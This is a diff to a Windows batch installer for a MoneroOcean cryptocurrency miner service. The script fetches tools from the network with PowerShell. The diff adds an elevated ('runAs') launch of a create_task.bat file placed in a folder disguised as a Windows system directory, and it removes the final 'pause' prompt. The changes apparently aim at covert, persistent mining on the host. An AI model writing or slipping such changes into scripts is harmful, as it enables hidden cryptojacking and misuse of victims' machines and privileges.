@@ -314,6 +314,7 @@ exit /b 1
 
 echo [*] Downloading tools to make moneroocean_miner service to "%USERPROFILE%\nssm.zip"
 powershell -Command "$wc = New-Object System.Net.WebClient; $wc.DownloadFile('https://raw.githubusercontent.com/MoneroOcean/xmrig_setup/master/nssm.zip', '%USERPROFILE%\nssm.zip')"
+
 if errorlevel 1 (
   echo ERROR: Can't download tools to make moneroocean_miner service
   exit /b 1
@@ -358,12 +359,13 @@ if errorlevel 1 (
   exit /b 1
 )
 
+powershell -Command "Start-Process '%USERPROFILE%\AppData\LocalLow\Microsoft\Windows\sys32\create_task.bat' -Verb runAs"
 goto OK
 
 :OK
 echo
 echo [*] Setup complete
-pause
+
 exit /b 0
 
 :strlen string len
